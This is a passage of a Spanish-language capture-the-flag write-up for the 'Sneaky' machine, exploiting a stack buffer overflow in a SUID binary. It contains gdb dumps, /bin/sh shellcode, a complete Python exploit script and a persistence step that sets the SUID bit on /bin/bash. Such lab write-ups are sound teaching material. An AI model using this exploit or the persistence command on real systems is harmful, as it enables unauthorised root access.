0024| 0xffffd3b8 --> 0xf7fca410 --> 0x804825e ("GLIBC_2.0")
0028| 0xffffd3bc --> 0xf7fa9000 --> 0x1e4d6c 
[------------------------------------------------------------------------------]

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
"0x42424242" in ?? ()
```
Perfecto como se aprecia Ya tenemos el `EBP` sobrescrito con `AAAA`, pero controlamos el `EIP` con nuestras `BBBB`

Usamos : “ i r ”
Para obtener informacion de los registros:
```bash
gdb-peda$ i r
eax            0x0                 0x0
ecx            0xffffd730          0xffffd730
edx            0xffffd39d          0xffffd39d
ebx            0x0                 0x0
esp            0xffffd3a0          0xffffd3a0
"ebp            0x41414141          0x41414141" AAAA
esi            0xf7fa9000          0xf7fa9000
edi            0xf7fa9000          0xf7fa9000
"eip            0x42424242          0x42424242" BBBB
eflags         0x10202             [ IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
```
AQUI YA TENEMOS EL CONTROL DEL EIP 
Enumeramos el sistema
```bash
thrasivoulos@Sneaky:/$ uname -a
Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
```
AHora vamos a buscar nuestro `shellcode` para que indicandole la direccion en el `EIP` podamos introducir nuestro shellcode como la siguiente intruccion en la pila a ejecutar.

SHELLCODE PARA LINUX x86 (32BITS) Buscamos x `Jean Pascall` para lanzarse una `/bin/sh`
http://shell-storm.org/shellcode/files/shellcode-811.php					====== 			/bin/sh
```bash
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   			"\x68\x68\x2f\x62\x69\x6e\x89"
                   			"\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   			"\xcd\x80\x31\xc0\x40\xcd\x80";
```
Como veiamos que el binario `"chal"` es `SUID y SUIG` y como nosotros podemos ejecutarlo, con que nos lance una shell ya lo seriamos `root`
```bash
thrasivoulos@Sneaky:/$ which chal | xargs ls -l
-rwsrwsr-x 1 root root 7301 May  4  2017 /usr/local/bin/chal
```
PERO y si la maquina tiene habilitada la opcion ARSL(que aletoriza algunas de las direciones de la memoria)
Forma de Comprobarlo:
Nos fijamos en el output de los comandos aqui abajo y repetimos a ver si son estaticos o dinamicos.
```bash
thrasivoulos@Sneaky:/usr/bin$ which chal | xargs ldd
        linux-gate.so.1 =>  (0xb7ffe000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e44000)
        /lib/ld-linux.so.2 (0x80000000)
thrasivoulos@Sneaky:/usr/bin$ which chal | xargs ldd
        linux-gate.so.1 =>  (0xb7ffe000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e44000)
        /lib/ld-linux.so.2 (0x80000000)
thrasivoulos@Sneaky:/usr/bin$ which chal | xargs ldd
        linux-gate.so.1 =>  (0xb7ffe000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e44000)
        /lib/ld-linux.so.2 (0x80000000)
```
Se ve claro que son ESTATICOS  por lo que PERFECTO.
Otra Forma:

`Siempre que devuelva un 0 es que el asrl no esta activado.`
`Siempre que devuelva un 1 es que el asrl si esta activado.`

```bash		
thrasivoulos@Sneaky:/usr/bin$ "cat /proc/sys/kernel/randomize_va_space "
0
```
No esta Activado
Ahora a NIVEL DE PROTECCIONES DEL BINARIO ¿HAY ALGUNA PROTECCION?
```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```
Nada no tiene nada activado, nos vamos a un directorio en la maquina victima que tengamos escritura y procedemos con nuestro script en python:
```python
exploit.py

#Para poner la direccion del EIP en Litle Indian
from struct import pack


def bufferOverFlow():

        offset = 362    # el numero hasta antes de sobrescribir el EIP
        junk = "A"*offset # basura
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# NOPS (NO Operation CODE Caracteres) Los calculamos Siempre: Multiplicando por offset y restandole shellcode
        nops = "\x90"*(offset-len(shellcode))
 
 # aqui seguimos sobrescribiendo el EIP con AAAA
 #      payload = nops + shellcode + "\x41\x41\x41\x41"      primer prueba payload para comprobar que el exploit funciona correctamente
        payload = nops + shellcode + pack( "<I", 0xbffff78c)  # Segundo payload, para apuntar un poco mas atras de nuestro shellcode en los NOPS

        print(payload)

if __name__ == '__main__':

        bufferOverFlow()
```
Aqui procedemos a hacerle la primera prueba a nuestro exploit.py con el primer payload del exploit.py
```bash
(gdb) r $(python exploit.py)
Starting program: /usr/local/bin/chal $(python exploit.py)

Program received signal SIGSEGV, Segmentation fault.
"0x41414141" in ?? ()
```
Vemos que `seguimos teniendo el contro del EIP`, Perfecto!

Ahora vamos a listar la pila y ver donde esta nuestro SHELLCODE PARA pillar una direccion desde mas atras, en los `NOPS` 
y que cuando se ejecute el `EIP` + la direccion antes de nuestro `SHELLCODE` se ejecute la `/bin/sh`
```bash
(gdb) x/100x $esp-100
0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff51c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff53c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff54c:     0x90909090"     0x6850c031      0x68732f2f      0x69622f68
0xbffff55c:     0x89e3896e      0xb0c289c1      0x3180cd0b      0x80cd40c0			nuestro shellcode en litle indian"
0xbffff56c:     0x41414141      0x00000000      0xbffff604      0xbffff610
0xbffff57c:     0xb7feccca      0x00000002      0xbffff604      0xbffff5a4
0xbffff58c:     0x0804a014      0x0804821c      0xb7fce000      0x00000000
0xbffff59c:     0x00000000      0x00000000      0x36fef84f      0x0e617c5f
0xbffff5ac:     0x00000000      0x00000000      0x00000000      0x00000002
0xbffff5bc:     0x08048320      0x00000000      0xb7ff24c0      0xb7e3ba09
0xbffff5cc:     0xb7fff000      0x00000002      0x08048320      0x00000000
0xbffff5dc:     0x08048341      0x0804841d      0x00000002      0xbffff604
0xbffff5ec:     0x08048450      0x080484c0      0xb7fed160      0xbffff5fc
0xbffff5fc:     0x0000001c      0x00000002      0xbffff72f      0xbffff743
0xbffff60c:     0x00000000      0xbffff8b2      0xbffff8c3      0xbffff8d3
0xbffff61c:     0xbffff8e7      0xbffff90d      0xbffff920      0xbffff932
0xbffff62c:     0xbffffe53      0xbffffe5f      0xbffffebd      0xbffffed9
0xbffff63c:     0xbffffee8      0xbffffef1      0xbfffff02      0xbfffff0b
0xbffff64c:     0xbfffff23      0xbfffff2b      0xbfffff40      0xbfffff87
0xbffff65c:     0xbfffffa7      0xbfffffc6      0x00000000      0x00000020
0xbffff66c:     0xb7fdccf0      0x00000021      0xb7fdc000      0x00000010
0xbffff67c:     0x078bfbff      0x00000006      0x00001000      0x00000011
0xbffff68c:     0x00000064      0x00000003      0x08048034      0x00000004
```
Ahora viendo mas o menos por donde queda nuestro `shellcode` procederiamos a apuntar a un poco mas atras en una direccion en la que esten los `NOPS` 
por si el contenido de los caracteres se desplaza por cualquier causa y que luego nos ejecute nuestro `shellcode` como `EIP`(Siguiente Intruccion a Reralizar) 
```bash
thrasivoulos@Sneaky:/tmp$ chal $(python exploit.py) 
# whoami
root
```
Ahora procederiamos a hacer un poco de Persistencia y conseguir la flag de `root.txt`
```bash
# chmod 4775 /bin/bash
# exit

thrasivoulos@Sneaky:/tmp$ bash -p
bash-4.3# whoami
root
# cat root/root.txt
c5153d86cb175a9d5d9axxxxxxxxxxxxxx
```
Maquina Rooteada =) ! Primer Buffer Overflow con Linux x86 ! 

